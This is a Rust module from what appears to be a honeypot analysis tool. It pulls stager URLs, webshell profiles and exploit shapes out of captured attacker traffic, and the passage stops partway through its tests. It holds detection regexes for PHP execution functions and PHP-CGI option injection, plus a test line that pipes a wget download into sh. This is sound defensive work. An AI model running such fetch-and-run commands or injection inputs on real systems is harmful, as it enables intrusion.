//! Typed pieces from the layers and recipes. Describers say what happened
//! (exploit, recipe, tag, shell profile); joiners say who (stager, key), and
//! tie addresses to one operator, so a value that is not clearly one
//! operator's is recorded as `queried` or not at all. Nothing is fetched or
//! resolved: hosts are only read as text.

use std::collections::{BTreeSet, HashMap, HashSet};
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
use std::sync::LazyLock;

use regex::bytes::{Captures, Regex};
use serde::Deserialize;

use super::container::{Source, form_fields};
use super::decode::push_opaque;
use super::key::{all_masks, fingerprints, marker_start};
use super::shell::{Node, Step};
use super::{Budget, LayerKind, MAX_URLS, MAX_VALUE, OpaqueReason, Span, Xray};

/// Most names one kind of value in a shell profile lists.
const PROFILE_NAMES: usize = 8;

/// How far back the start of a statement is looked for.
const MAX_STATEMENT: usize = 512;

/// Longest query argument name kept in an exploit value.
const MAX_ARG: usize = 32;

/// Names that only mean something inside one network.
const LOCAL_SUFFIXES: [&str; 11] = [
    "localhost",
    "localdomain",
    "local",
    "internal",
    "intranet",
    "lan",
    "home",
    "corp",
    "test",
    "invalid",
    "example",
];

/// A request input, as a PHP script reads it.
const INPUT: &str =
    r#"\$_(GET|POST|REQUEST|COOKIE|SERVER)\s*\[\s*['"]?([A-Za-z0-9_-]{1,32})['"]?\s*\]"#;

/// Not preceded by a name, a `->` or a `::`: `$db->exec()` and `curl_exec()`
/// are other functions.
const FUNCTION: &str = r"(?:^|[^A-Za-z0-9_$>:])";

fn regex(pattern: &str) -> Regex {
    Regex::new(pattern).expect("static regex")
}

/// Calls whose string argument is shown, not fetched. `url()` is a CSS
/// function.
const SHOWN: [&[u8]; 6] = [b"url", b"echo", b"print", b"printf", b"die", b"exit"];

/// A URL with a scheme, up to what ends one in a script.
static URL: LazyLock<Regex> =
    LazyLock::new(|| regex(r#"(?i-u)\b(?:https?|ftps?|sftp|tftp|scp)://[^\s'"<>`\\|^;]+"#));
static PHP_EXEC: LazyLock<Regex> = LazyLock::new(|| {
    regex(&format!(
        r"(?i-u){FUNCTION}(system|shell_exec|exec|passthru|popen|proc_open|pcntl_exec|eval|assert)\s*\("
    ))
});
static PHP_FETCH: LazyLock<Regex> = LazyLock::new(|| {
    regex(&format!(
        r"(?i-u){FUNCTION}(?:curl_init|file_get_contents|fopen|copy)\s*\("
    ))
});
static PHP_WRITE: LazyLock<Regex> = LazyLock::new(|| {
    regex(&format!(
        r#"(?is-u){FUNCTION}(?:file_put_contents\s*\(|fopen\s*\([^;]*?,\s*['"][waxc])|\bCURLOPT_FILE\b"#
    ))
});
/// A fetch inside `eval` or `assert`: what it fetches is run.
static PHP_FETCH_RUN: LazyLock<Regex> = LazyLock::new(|| {
    regex(&format!(
        r"(?is-u){FUNCTION}(?:eval|assert)\s*\([^;]*?(?:file_get_contents|curl_exec|stream_get_contents)\s*\("
    ))
});
/// The variable `copy` reads.
static PHP_COPY_VAR: LazyLock<Regex> =
    LazyLock::new(|| regex(&format!(r"(?i-u){FUNCTION}copy\s*\(\s*\$([A-Za-z0-9_]+)")));
/// A PHP-CGI option PHP loads and runs the file of.
static PHP_CGI_LOAD: LazyLock<Regex> =
    LazyLock::new(|| regex(r"(?-u)(?:auto_prepend_file|auto_append_file)[ \t]*=[ \t]*"));
static PHP_INPUT: LazyLock<Regex> = LazyLock::new(|| regex(&format!(r"(?-u){INPUT}|php://input")));
/// The input compared, before or after the operator. Either way the input
/// is the first capture pair.
static PHP_CHECK: LazyLock<[Regex; 2]> = LazyLock::new(|| {
    [
        regex(&format!(r"(?-u){INPUT}[\s)]*[=!]==?")),
        regex(&format!(r"(?-u)[=!]==?\s*(?:(?:md5|sha1)\s*\(\s*)?{INPUT}")),
    ]
});
static PHP_ECHO: LazyLock<Regex> = LazyLock::new(|| {
    regex(&format!(
        r#"(?i-u){FUNCTION}(?:echo|print)\s*\(?\s*(?:'([^'\\\n]{{3,64}})'|"([^"\\\n]{{3,64}})")"#
    ))
});
/// `-d name=` of a PHP-CGI option injection.
static PHP_OPTION: LazyLock<Regex> =
    LazyLock::new(|| regex(r"(?-u)(?:^|[ \t])(?:\xAD|-)d[ \t]*([A-Za-z0-9_.]+)"));
/// A multipart part that is a file.
static FILE_PART: LazyLock<Regex> =
    LazyLock::new(|| regex(r#"(?im-u)^content-disposition:[^\r\n]*\bfilename\*?="#));

/// A piece's kind. `file` comes from the store.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum PieceKind {
    Exploit,
    Recipe,
    Tag,
    ShellProfile,
    Stager,
    Key,
}

/// What a piece was in its source.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Role {
    Exploit,
    Tag,
    Recipe,
    Stager,
    SelfHosted,
    Queried,
    Key,
    File,
    Opaque,
}

/// How far a piece is confirmed.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Grade {
    /// The trap received or held it.
    Seen,
    /// The attacker's text says so; nothing confirmed it.
    Claimed,
    /// An operator entered it from outside analysis.
    External,
}

/// One thing found in a source. `url` is the raw text a stager's value came
/// from, for the sandbox; show it defanged.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Piece {
    pub kind: PieceKind,
    pub role: Role,
    pub grade: Grade,
    pub value: String,
    pub url: Option<String>,
    pub at: Span,
}

/// What the parser is told: `rules/evidence/shared_hosts.toml`.
#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Policy {
    shared: Vec<String>,
    never: Vec<String>,
}

static EMBEDDED: LazyLock<Policy> = LazyLock::new(|| {
    toml::from_str(include_str!("../../../rules/evidence/shared_hosts.toml"))
        .expect("static host list")
});

impl Policy {
    /// The list built into the binary.
    pub fn embedded() -> &'static Policy {
        &EMBEDDED
    }

    fn is_shared(&self, host: &str) -> bool {
        self.shared.iter().any(|name| on_suffix(host, name))
    }

    /// The shared host itself, not a user's own name under it.
    fn is_shared_root(&self, host: &str) -> bool {
        self.shared.iter().any(|name| name == host)
    }

    fn joins_nothing(&self, host: &str) -> bool {
        self.never.iter().any(|name| on_suffix(host, name))
    }
}

fn on_suffix(host: &str, name: &str) -> bool {
    host.strip_suffix(name)
        .is_some_and(|rest| rest.is_empty() || rest.ends_with('.'))
}

/// `s` cut to at most [`MAX_VALUE`] bytes, on a character boundary.
fn cut(mut s: String) -> String {
    let mut end = MAX_VALUE.min(s.len());
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    s.truncate(end);
    s
}

/// The pieces found so far, and what is left of the limits.
struct Found {
    pieces: Vec<Piece>,
    seen: HashSet<(PieceKind, Role, String, Option<String>)>,
    urls: HashMap<String, usize>,
    /// Hosts this source fetched and kept: read again elsewhere in it, they
    /// are the same stager and not a query.
    kept: HashSet<String>,
    left: usize,
    over: bool,
}

impl Found {
    fn push(&mut self, mut piece: Piece) {
        if piece.value.len() > MAX_VALUE {
            self.over = true;
            return;
        }
        // The value still says who; only the URL is too long to keep.
        if piece.url.as_ref().is_some_and(|u| u.len() > MAX_VALUE) {
            self.over = true;
            piece.url = None;
        }
        let key = (
            piece.kind,
            piece.role,
            piece.value.clone(),
            piece.url.clone(),
        );
        if !self.seen.insert(key) {
            return;
        }
        if self.left == 0 {
            self.over = true;
            return;
        }
        if piece.url.is_some() {
            let urls = self.urls.entry(piece.value.clone()).or_default();
            if *urls >= MAX_URLS {
                self.over = true;
                return;
            }
            *urls += 1;
        }
        self.left -= 1;
        self.pieces.push(piece);
    }
}

/// Fill `xray.pieces` from its layers and recipes, spending `budget.pieces`.
/// What joins goes first, and queried URLs last, so a flood of them pushes
/// nothing out.
pub(super) fn extract(xray: &mut Xray, source: &Source<'_>, policy: &Policy, budget: &mut Budget) {
    let sender = match source {
        Source::Request { sender, .. } | Source::Upload { sender, .. } => *sender,
    };
    let masks = all_masks(xray);
    let mut found = Found {
        pieces: Vec::new(),
        seen: HashSet::new(),
        urls: HashMap::new(),
        kept: HashSet::new(),
        left: budget.pieces,
        over: false,
    };
    let urls = Urls {
        policy,
        sender,
        masks: &masks,
    };

    exploit(xray, source, &mut found);
    keys(xray, &mut found);
    urls.saved(xray, &mut found);
    recipes(xray, &masks, &mut found);
    profiles(xray, &masks, &mut found);
    urls.queried(xray, &mut found);

    budget.pieces = found.left;
    xray.pieces = found.pieces;
    if found.over {
        let at = Span {
            layer: 0,
            start: 0,
            end: xray.layers[0].text.len(),
        };
        push_opaque(xray, at, OpaqueReason::OverLimit);
    }
}

fn is_php(xray: &Xray, layer: usize) -> bool {
    xray.layers[layer].kind == LayerKind::Php || (layer == 0 && xray.php_body)
}

fn php_layers(xray: &Xray) -> impl Iterator<Item = usize> + '_ {
    (0..xray.layers.len()).filter(|&i| is_php(xray, i))
}

/// The exploit piece: only for a request that carries something executable,
/// as a path alone says nothing. Uploads are not requests: theirs is the
/// request that delivered them.
fn exploit(xray: &Xray, source: &Source<'_>, found: &mut Found) {
    let Source::Request {
        method,
        path,
        query,
        body,
        ..
    } = source
    else {
        return;
    };
    let php_cgi = xray.layers.iter().find(|l| l.kind == LayerKind::PhpCgi);
    let put = method.eq_ignore_ascii_case("PUT") && body.is_some_and(|b| !b.is_empty());
    let executable = !xray.recipes.is_empty()
        || xray.php_body
        || php_cgi.is_some()
        || php_layers(xray).any(|i| PHP_EXEC.is_match(&xray.layers[i].text))
        || put
        || FILE_PART.is_match(&xray.layers[0].text);
    if !executable {
        return;
    }
    // Nothing from a key's marker on is read.
    let before_key = |text: &'_ str| marker_start(text.as_bytes()).unwrap_or(text.len());
    let query = query.unwrap_or("");
    let query = query.get(..before_key(query)).unwrap_or("");
    let path = path.get(..before_key(path)).unwrap_or("");
    let names: BTreeSet<String> = match php_cgi {
        Some(layer) => PHP_OPTION
            .captures_iter(&layer.text)
            .map(|c| format!("-d {}", String::from_utf8_lossy(&c[1]).to_ascii_lowercase()))
            .collect(),
        None => form_fields(query.as_bytes(), 0)
            .iter()
            .filter_map(|f| arg_name(&f.name))
            .collect(),
    };
    let method: String = method
        .chars()
        .filter(char::is_ascii_alphabetic)
        .take(16)
        .collect();
    let mut value = format!(
        "{} {}",
        method.to_ascii_uppercase(),
        crate::model::shape::shape(path).1
    );
    if !names.is_empty() {
        let names: Vec<String> = names.into_iter().collect();
        value = format!("{value} ?{}", names.join(" "));
    }
    found.push(Piece {
        kind: PieceKind::Exploit,
        role: Role::Exploit,
        grade: Grade::Seen,
        value: cut(value),
        url: None,
        at: Span {
            layer: 0,
            start: 0,
            end: 0,
        },
    });
}

/// A query argument's name, normalised as a path segment is, so random and
/// numbered names read the same. Anything but a plain name is no name.
fn arg_name(name: &[u8]) -> Option<String> {
    let plain = !name.is_empty()
        && name.len() <= MAX_ARG
        && name
            .iter()
            .all(|&b| b.is_ascii_alphanumeric() || b"_.-[]".contains(&b));
    if !plain {
        return None;
    }
    let name = String::from_utf8_lossy(name);
    let shape = crate::model::shape::shape(&format!("/{name}")).1;
    Some(shape.trim_start_matches('/').to_string())
}

fn keys(xray: &Xray, found: &mut Found) {
    for (layer, l) in xray.layers.iter().enumerate() {
        for (start, end, value) in fingerprints(&l.text) {
            found.push(Piece {
                kind: PieceKind::Key,
                role: Role::Key,
                grade: Grade::Seen,
                value,
                url: None,
                at: Span { layer, start, end },
            });
        }
    }
}

/// The height of a recipe's tree bounds the recursion.
fn steps<'a>(nodes: &'a [Node], out: &mut Vec<&'a Step>) {
    for node in nodes {
        match node {
            Node::Step(step) => out.push(step),
            Node::Pipe(inner) => steps(inner, out),
            Node::Try { first, fallback } => {
                steps(first, out);
                steps(fallback, out);
            }
        }
    }
}

/// A recipe's steps, all recipes, in order.
fn all_steps(xray: &Xray) -> Vec<(usize, &Step)> {
    let mut all = Vec::new();
    for recipe in &xray.recipes {
        let mut list = Vec::new();
        steps(&recipe.nodes, &mut list);
        all.extend(list.into_iter().map(|step| (recipe.layer, step)));
    }
    all
}

fn whole(xray: &Xray, layer: usize) -> Span {
    Span {
        layer,
        start: 0,
        end: xray.layers[layer].text.len(),
    }
}

fn overlaps(mask: &[(usize, usize)], start: usize, end: usize) -> bool {
    mask.iter().any(|&(s, e)| start < e && s < end)
}

/// Where in `text` the word last is; a word changed by unquoting is not
/// found, and the caller keeps the whole layer as its place.
fn last_place(text: &[u8], word: &str) -> Option<(usize, usize)> {
    let word = Regex::new(&regex::escape(word)).ok()?;
    let last = word.find_iter(text).last()?;
    Some((last.start(), last.end()))
}

fn recipes(xray: &Xray, masks: &[Vec<(usize, usize)>], found: &mut Found) {
    for recipe in &xray.recipes {
        found.push(Piece {
            kind: PieceKind::Recipe,
            role: Role::Recipe,
            grade: Grade::Claimed,
            value: recipe.normal.clone(),
            url: None,
            at: whole(xray, recipe.layer),
        });
    }
    for (layer, step) in all_steps(xray) {
        let Step::Run { tag: Some(tag), .. } = step else {
            continue;
        };
        let whole = whole(xray, layer);
        let (start, end) = last_place(&xray.layers[layer].text, tag).unwrap_or((0, whole.end));
        if overlaps(&masks[layer], start, end) {
            continue;
        }
        found.push(Piece {
            kind: PieceKind::Tag,
            role: Role::Tag,
            grade: Grade::Claimed,
            value: tag.clone(),
            url: None,
            at: Span { layer, start, end },
        });
    }
}

fn profiles(xray: &Xray, masks: &[Vec<(usize, usize)>], found: &mut Found) {
    for layer in php_layers(xray) {
        if let Some(value) = profile(&xray.layers[layer].text, &masks[layer]) {
            found.push(Piece {
                kind: PieceKind::ShellProfile,
                // No role of its own: it says what the source runs.
                role: Role::Recipe,
                grade: Grade::Seen,
                value,
                url: None,
                at: whole(xray, layer),
            });
        }
    }
}

/// `$_GET[cmd]`, for a capture of [`INPUT`]. Of `$_SERVER`, only what the
/// client sends is an input.
fn input_name(c: &Captures<'_>) -> Option<String> {
    let (Some(source), Some(name)) = (c.get(1), c.get(2)) else {
        return Some("php://input".to_string());
    };
    let (source, name) = (source.as_bytes(), name.as_bytes());
    if source == b"SERVER" && !name.starts_with(b"HTTP_") {
        return None;
    }
    Some(format!(
        "$_{}[{}]",
        String::from_utf8_lossy(source),
        String::from_utf8_lossy(name)
    ))
}

fn listing(names: impl IntoIterator<Item = String>) -> String {
    let names: Vec<String> = names.into_iter().take(PROFILE_NAMES).collect();
    names.join(",")
}

/// What a text webshell is, without running it. It needs an input read and
/// a function that executes: the rest of a script is no webshell.
fn profile(text: &[u8], mask: &[(usize, usize)]) -> Option<String> {
    let exec: BTreeSet<String> = PHP_EXEC
        .captures_iter(text)
        .map(|c| String::from_utf8_lossy(&c[1]).to_ascii_lowercase())
        .collect();
    let reads: BTreeSet<String> = PHP_INPUT
        .captures_iter(text)
        .filter_map(|c| input_name(&c))
        .collect();
    if exec.is_empty() || reads.is_empty() {
        return None;
    }
    let checks: BTreeSet<String> = PHP_CHECK
        .iter()
        .flat_map(|check| check.captures_iter(text))
        .filter_map(|c| input_name(&c))
        .collect();
    let inputs: BTreeSet<String> = reads.difference(&checks).cloned().collect();
    let inputs = if inputs.is_empty() { reads } else { inputs };

    let mut value = format!("input={};exec={}", listing(inputs), listing(exec));
    if !checks.is_empty() {
        value += &format!(";password={}", listing(checks));
    }
    let markers: BTreeSet<String> = PHP_ECHO
        .captures_iter(text)
        .filter_map(|c| c.get(1).or(c.get(2)))
        .filter(|m| !overlaps(mask, m.start(), m.end()))
        .map(|m| m.as_bytes())
        .filter(|m| {
            m.iter()
                .all(|&b| matches!(b, 0x20..=0x7e) && !b"<>$;=,".contains(&b))
        })
        .map(|m| String::from_utf8_lossy(m).into_owned())
        .collect();
    if !markers.is_empty() {
        value += &format!(";marker={}", listing(markers));
    }
    Some(cut(value))
}

/// A URL or `scp` target taken apart. `bare`: written with no scheme.
struct Target {
    scheme: String,
    host: String,
    path: String,
    query: String,
    bare: bool,
}

/// `[user@]host:path` for `scp`, otherwise a URL, with or without a scheme
/// (`curl example.org/x`). An address is read in its one normal form, and a
/// target with no host is none.
fn read_target(text: &str, scp: bool) -> Option<Target> {
    let (scheme, rest) = match text.split_once("://") {
        Some((scheme, rest))
            if !scheme.is_empty() && scheme.bytes().all(|b| b.is_ascii_alphanumeric()) =>
        {
            (Some(scheme.to_ascii_lowercase()), rest)
        }
        _ => (None, text),
    };
    let bare = scheme.is_none();
    let scp = scp && bare;
    let scheme = scheme.unwrap_or_else(|| if scp { "scp" } else { "http" }.to_string());
    let (authority, path, query) = if scp {
        // Past a bracketed address; the path starts at the colon.
        let closed = rest.find(']').unwrap_or(0);
        let colon = rest[closed..].find(':').map_or(rest.len(), |p| closed + p);
        let path = rest.get(colon + 1..).unwrap_or("").trim_start_matches('/');
        (&rest[..colon], format!("/{path}"), "")
    } else {
        let end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
        let tail = rest[end..].split('#').next().unwrap_or("");
        let (path, query) = tail.split_once('?').unwrap_or((tail, ""));
        (&rest[..end], path.to_string(), query)
    };
    let host = authority.rsplit('@').next().unwrap_or(authority);
    let host = match host.strip_prefix('[') {
        Some(inner) => inner.split(']').next().unwrap_or(inner),
        None => host.split(':').next().unwrap_or(host),
    };
    let host = host.trim_end_matches('.').to_ascii_lowercase();
    if host.is_empty() {
        return None;
    }
    let host = match host.parse::<Ipv6Addr>() {
        Ok(addr) => addr.to_string(),
        Err(_) => host,
    };
    Some(Target {
        scheme,
        host,
        path,
        query: query.to_string(),
        bare,
    })
}

fn public_v4(ip: Ipv4Addr) -> bool {
    let [a, b, ..] = ip.octets();
    !(ip.is_private()
        || ip.is_loopback()
        || ip.is_link_local()
        || ip.is_multicast()
        || a == 0
        || a >= 240
        || (a == 100 && (b & 0xc0) == 64))
}

fn public_ip(ip: IpAddr) -> bool {
    match ip.to_canonical() {
        IpAddr::V4(ip) => public_v4(ip),
        IpAddr::V6(ip) => {
            let first = ip.segments()[0];
            // `::127.0.0.1`, the old way to write an address in one.
            if ip.segments()[..6] == [0; 6] {
                return public_v4(Ipv4Addr::from_bits(ip.to_bits() as u32));
            }
            !(ip.is_multicast() || (first & 0xfe00) == 0xfc00 || (first & 0xffc0) == 0xfe80)
        }
    }
}

/// Can this host say anything about an operator? A name needs a dot and a
/// real last label: `2130706433`, `0x7f.1` and `127.1` are addresses in
/// disguise, and a name with `$` or `{` was never filled in.
fn joinable(host: &str, policy: &Policy) -> bool {
    if policy.joins_nothing(host) {
        return false;
    }
    if let Ok(ip) = host.parse::<IpAddr>() {
        return public_ip(ip);
    }
    let plain = host
        .bytes()
        .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b"-._".contains(&b));
    let last = host.rsplit('.').next().unwrap_or(host);
    let numeric = last.bytes().all(|b| b.is_ascii_digit()) || last.starts_with("0x");
    plain
        && host.contains('.')
        && !host.split('.').any(str::is_empty)
        && !numeric
        && !LOCAL_SUFFIXES.iter().any(|name| on_suffix(host, name))
}

fn same_host(host: &str, sender: &str) -> bool {
    match (host.parse::<IpAddr>(), sender.parse::<IpAddr>()) {
        (Ok(a), Ok(b)) => a.to_canonical() == b.to_canonical(),
        _ => host.eq_ignore_ascii_case(sender),
    }
}

/// The string literals of PHP text, without their quotes. Comments are
/// skipped, so a call in one is none, and `//` in a string is no comment.
fn php_literals(text: &[u8]) -> Vec<(usize, usize)> {
    let until = |from: usize, end: &[u8]| {
        text[from.min(text.len())..]
            .windows(end.len())
            .position(|w| w == end)
            .map_or(text.len(), |p| from + p + end.len())
    };
    let mut found = Vec::new();
    let mut i = 0;
    while i < text.len() {
        match (text[i], text.get(i + 1)) {
            (b'#', _) | (b'/', Some(b'/')) => i = until(i, b"\n"),
            (b'/', Some(b'*')) => i = until(i + 2, b"*/"),
            (quote @ (b'\'' | b'"'), _) => {
                let mut end = i + 1;
                while end < text.len() && text[end] != quote {
                    end += if text[end] == b'\\' { 2 } else { 1 };
                }
                if end >= text.len() {
                    break;
                }
                found.push((i + 1, end));
                i = end + 1;
            }
            _ => i += 1,
        }
    }
    found
}

fn name_byte(b: &u8) -> bool {
    b.is_ascii_alphanumeric() || *b == b'_'
}

/// Where the text before `end` stops being blank.
fn blank_back(text: &[u8], end: usize) -> usize {
    text[..end]
        .iter()
        .rposition(|b| !b.is_ascii_whitespace())
        .map_or(0, |p| p + 1)
}

/// The name that ends at `end`, blanks passed, and where it starts.
fn name_before(text: &[u8], end: usize) -> (&[u8], usize) {
    let end = blank_back(text, end);
    let start = text[..end]
        .iter()
        .rposition(|b| !name_byte(b))
        .map_or(0, |p| p + 1);
    (&text[start..end], start)
}

/// Inside `echo`, `print` and the like: what it writes out, a link or a
/// credit, is not fetched.
fn in_output(text: &[u8], at: usize) -> bool {
    let from = at.saturating_sub(MAX_STATEMENT);
    let start = text[from..at]
        .iter()
        .rposition(|b| b";{}".contains(b))
        .map_or(from, |p| from + p + 1);
    let statement = text[start..at].trim_ascii_start().to_ascii_lowercase();
    let word = statement.iter().position(|b| !name_byte(b));
    let word = &statement[..word.unwrap_or(statement.len())];
    SHOWN.contains(&word)
}

/// What a whole string literal starting at `start` is in.
enum Literal<'a> {
    /// `include`, `require`, and `copy`'s source: it is saved or run.
    Kept,
    /// An argument of some other call.
    Argument,
    /// Assigned to this variable.
    Assigned(&'a [u8]),
    /// None of those: text, an attribute, an operand.
    Other,
}

fn literal_use(text: &[u8], start: usize) -> Literal<'_> {
    let quote = start - 1;
    let at = blank_back(text, quote);
    let lower = |name: &[u8]| name.to_ascii_lowercase();
    let keeps = |name: &[u8]| {
        matches!(
            lower(name).as_slice(),
            b"include" | b"include_once" | b"require" | b"require_once"
        )
    };
    if keeps(name_before(text, at).0) {
        return Literal::Kept;
    }
    let shown = in_output(text, quote);
    match text[..at].last() {
        Some(b'(') => {
            let name = name_before(text, at - 1).0;
            if keeps(name) || lower(name) == b"copy" {
                Literal::Kept
            } else if shown || SHOWN.contains(&lower(name).as_slice()) {
                Literal::Other
            } else {
                Literal::Argument
            }
        }
        Some(b',') if !shown => Literal::Argument,
        Some(b'=') if !shown => {
            // `$url = '…'`, not `href = '…'`, `==` or `=>`.
            let end = blank_back(text, at - 1);
            let (name, from) = name_before(text, end);
            match text[..from].last() {
                Some(b'$') if !name.is_empty() => Literal::Assigned(name),
                Some(b'>') if !name.is_empty() && text[..from].ends_with(b"->") => {
                    Literal::Assigned(name)
                }
                _ if text[..end].last() == Some(&b']') => Literal::Assigned(b""),
                _ => Literal::Other,
            }
        }
        _ => Literal::Other,
    }
}

/// A URL match, without the punctuation a sentence or a call puts after it.
fn trimmed(url: &[u8]) -> &[u8] {
    let mut url = url;
    while let [
        rest @ ..,
        b'.' | b',' | b':' | b'!' | b'?' | b')' | b']' | b'}' | b'&',
    ] = url
    {
        url = rest;
    }
    url
}

/// How URLs become pieces.
struct Urls<'a> {
    policy: &'a Policy,
    sender: Option<&'a str>,
    masks: &'a [Vec<(usize, usize)>],
}

impl Urls<'_> {
    /// `saved`: the source fetches it and runs or saves the result. `tool`
    /// is what fetches it, when a recipe says so.
    fn piece(&self, text: &str, at: Span, saved: bool, tool: &str) -> Option<Piece> {
        let t = read_target(text, tool == "scp")?;
        let shared = self.policy.is_shared(&t.host);
        // `raw.php?i=abc`: the query is what names the paste.
        let segments = t.path.split('/').filter(|s| !s.is_empty()).count();
        let names = !t.query.is_empty() && (t.path.ends_with(".php") || segments == 1);
        let path = t.path.trim_end_matches('/');
        let place = if names {
            format!("{path}?{}", t.query)
        } else {
            path.to_string()
        };
        let value = if shared {
            format!("{}://{}{place}", t.scheme, t.host)
        } else {
            t.host.clone()
        };
        // Text not filled in, or a path every user of the host shares, would
        // be one value for everybody on it.
        let unfilled = place.contains("%s")
            || place.contains("%d")
            || place.bytes().any(|b| b"${}()`<>\"'".contains(&b));
        let generic = self.policy.is_shared_root(&t.host)
            && !names
            && (path.is_empty()
                || path.ends_with(".php")
                || path.rsplit('/').next() == Some("raw"));
        let blank = unfilled || generic;
        // `curl install.sh`: a file name reads as a host just as well, and
        // unrelated scripts share file names.
        let file_name = matches!(tool, "wget" | "curl")
            && t.bare
            && t.path.is_empty()
            && t.host.parse::<IpAddr>().is_err();
        let joins = saved && !file_name && joinable(&t.host, self.policy) && !(shared && blank);
        let role = if !joins {
            Role::Queried
        } else if self.sender.is_some_and(|s| same_host(&t.host, s)) {
            Role::SelfHosted
        } else {
            Role::Stager
        };
        Some(Piece {
            kind: PieceKind::Stager,
            role,
            grade: Grade::Claimed,
            value,
            url: Some(text.to_string()),
            at,
        })
    }

    fn keep(&self, piece: Option<Piece>, found: &mut Found) {
        let Some(piece) = piece else { return };
        if piece.role != Role::Queried {
            found.kept.insert(piece.value.clone());
        }
        found.push(piece);
    }

    /// Whether the range holds key text: such a URL is kept nowhere.
    fn free(&self, at: Span) -> bool {
        !self
            .masks
            .get(at.layer)
            .is_some_and(|mask| overlaps(mask, at.start, at.end))
    }

    /// A URL in PHP text that the script keeps: a whole string, handed to
    /// `include` or `copy`, or, in a layer that both fetches and writes or
    /// runs what it fetches, an argument or a variable's value. Such a
    /// script often takes the URL as an argument of its own function, so
    /// the layer is read, not one call. Text it only shows joins nothing, as
    /// a shared script's credit link would tie all its users together.
    fn php_saved(&self, xray: &Xray, layer: usize, found: &mut Found) {
        let text = &xray.layers[layer].text;
        let keeps =
            PHP_FETCH_RUN.is_match(text) || (PHP_FETCH.is_match(text) && PHP_WRITE.is_match(text));
        let copied: HashSet<&[u8]> = PHP_COPY_VAR
            .captures_iter(text)
            .filter_map(|c| c.get(1))
            .map(|m| m.as_bytes())
            .collect();
        for (start, end) in php_literals(text) {
            let Some((0, len, url)) = urls_in(&text[start..end]).next() else {
                continue;
            };
            if len != end - start {
                continue;
            }
            let promoted = match literal_use(text, start) {
                Literal::Kept => true,
                Literal::Argument => keeps,
                Literal::Assigned(name) => keeps || copied.contains(name),
                Literal::Other => false,
            };
            let at = Span { layer, start, end };
            if promoted && self.free(at) {
                self.keep(self.piece(&url, at, true, ""), found);
            }
        }
        if !keeps {
            return;
        }
        // `file_get_contents(base64_decode('…'))`: the URL is what it opens.
        for (child, l) in xray.layers.iter().enumerate() {
            let decoded = matches!(
                l.kind,
                LayerKind::Base64 | LayerKind::Gzip | LayerKind::Hex | LayerKind::Escapes
            );
            if !decoded || l.parent != Some(layer) {
                continue;
            }
            let at = whole(xray, child);
            if let Some((0, end, url)) = urls_in(&l.text).next()
                && end == l.text.len()
                && self.free(at)
            {
                self.keep(self.piece(&url, at, true, ""), found);
            }
        }
    }

    /// What a recipe fetches and keeps, what PHP does, and what a PHP-CGI
    /// option loads.
    fn saved(&self, xray: &Xray, found: &mut Found) {
        for (_, step) in all_steps(xray) {
            if let Step::Fetch {
                tool,
                target,
                saves: true,
            } = step
                && self.free(*target)
                && let Some(text) = span_text(xray, *target)
            {
                self.keep(self.piece(&text, *target, true, tool), found);
            }
        }
        for layer in php_layers(xray) {
            self.php_saved(xray, layer, found);
        }
        for (layer, l) in xray.layers.iter().enumerate() {
            if l.kind != LayerKind::PhpCgi {
                continue;
            }
            for option in PHP_CGI_LOAD.find_iter(&l.text) {
                let start = option.end();
                if let Some((0, len, url)) = urls_in(&l.text[start..]).next() {
                    let end = start + len;
                    let at = Span { layer, start, end };
                    if self.free(at) {
                        self.keep(self.piece(&url, at, true, ""), found);
                    }
                }
            }
        }
    }

    /// Every other URL anywhere joins nothing, whatever it is in.
    fn queried(&self, xray: &Xray, found: &mut Found) {
        let mut add = |piece: Option<Piece>| {
            if let Some(piece) = piece.filter(|p| !found.kept.contains(&p.value)) {
                found.push(piece);
            }
        };
        for (_, step) in all_steps(xray) {
            if let Step::Fetch { tool, target, .. } = step
                && self.free(*target)
                && let Some(text) = span_text(xray, *target)
            {
                add(self.piece(&text, *target, false, tool));
            }
        }
        for (layer, l) in xray.layers.iter().enumerate() {
            for (start, end, url) in urls_in(&l.text) {
                let at = Span { layer, start, end };
                if self.free(at) {
                    add(self.piece(&url, at, false, ""));
                }
            }
        }
    }
}

fn span_text(xray: &Xray, at: Span) -> Option<String> {
    let bytes = xray.layers.get(at.layer)?.text.get(at.start..at.end)?;
    Some(String::from_utf8_lossy(bytes).into_owned())
}

/// The URLs of a text, with their ranges.
pub(super) fn urls_in(text: &[u8]) -> impl Iterator<Item = (usize, usize, String)> + '_ {
    URL.find_iter(text).map(|m| {
        let url = trimmed(m.as_bytes());
        let end = m.start() + url.len();
        (m.start(), end, String::from_utf8_lossy(url).into_owned())
    })
}

#[cfg(test)]
mod tests {
    use super::super::{MAX_PIECES, parse};
    use super::*;

    const SENDER: &str = "198.51.100.7";

    fn request(method: &str, path: &str, query: Option<&str>, body: &[u8]) -> Xray {
        parse(
            Source::Request {
                method,
                path,
                query,
                body: Some(body),
                sender: Some(SENDER),
            },
            Policy::embedded(),
        )
    }

    fn post(body: &str) -> Xray {
        request("POST", "/x", None, body.as_bytes())
    }

    fn upload(text: &str) -> Xray {
        parse(
            Source::Upload {
                name: Some("a.txt"),
                text: text.as_bytes(),
                sender: Some(SENDER),
            },
            Policy::embedded(),
        )
    }

    fn of(x: &Xray, kind: PieceKind) -> Vec<&Piece> {
        x.pieces.iter().filter(|p| p.kind == kind).collect()
    }

    fn one(x: &Xray, kind: PieceKind) -> &Piece {
        let found = of(x, kind);
        assert_eq!(found.len(), 1, "{:?}", x.pieces);
        found[0]
    }

    fn role_of(x: &Xray, value: &str) -> Role {
        let found: Vec<_> = x.pieces.iter().filter(|p| p.value == value).collect();
        assert_eq!(found.len(), 1, "{value}: {:?}", x.pieces);
        found[0].role
    }

    fn stager_role(url: &str) -> (Role, String) {
        let x = post(&format!("wget {url} -O- | sh"));
        let p = one(&x, PieceKind::Stager);
        (p.role, p.value.clone())
    }

    #[test]
    fn embedded_policy_loads() {
        let p = Policy::embedded();
        assert!(p.shared.iter().any(|h| h == "pastebin.com"));
        assert!(p.never.iter().any(|h| h == "w3.org"));
        for host in p.shared.iter().chain(&p.never) {
